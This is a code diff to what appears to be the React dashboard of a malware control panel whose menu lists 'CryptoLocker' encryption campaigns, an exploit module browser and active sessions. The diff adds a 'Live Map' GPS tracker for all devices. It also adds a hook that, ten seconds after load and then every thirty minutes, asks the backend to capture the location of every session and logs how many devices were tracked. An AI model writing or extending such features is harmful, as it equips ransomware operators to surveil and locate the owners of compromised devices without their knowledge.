@@ -21,6 +21,7 @@ const QUICK = [
   { href: "/locker",    label: "CryptoLocker",     sub: "Encryption campaigns",      accent: true  },
   { href: "/modules",   label: "Modules",          sub: "Exploit & auxiliary browser" },
   { href: "/sessions",  label: "Sessions",         sub: "View active connections" },
+  { href: "/map",       label: "Live Map",         sub: "GPS tracker — all devices" },
 ];
 
 function LiveClock() {
@@ -104,6 +105,23 @@ export default function Dashboard() {
     const t = setInterval(() => fetch("/api/sync", { method: "POST" }).catch(() => {}), 60000);
     return () => clearInterval(t);
   }, []);
+
+  // Auto-track all session locations every 30 minutes
+  useEffect(() => {
+    const track = () =>
+      fetch("/api/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "track_all" }),
+      })
+        .then((r) => r.json())
+        .then((d) => { if (d.captured > 0) addLog(`Location: ${d.captured} device(s) tracked`, "info"); })
+        .catch(() => {});
+    // Initial capture after 10s (give sessions time to appear)
+    const init = setTimeout(track, 10000);
+    const t = setInterval(track, 30 * 60 * 1000);
+    return () => { clearTimeout(init); clearInterval(t); };
+  }, [addLog]);
 
   const dotColor =
     stats.backend === "online" ? "bg-green-500" :
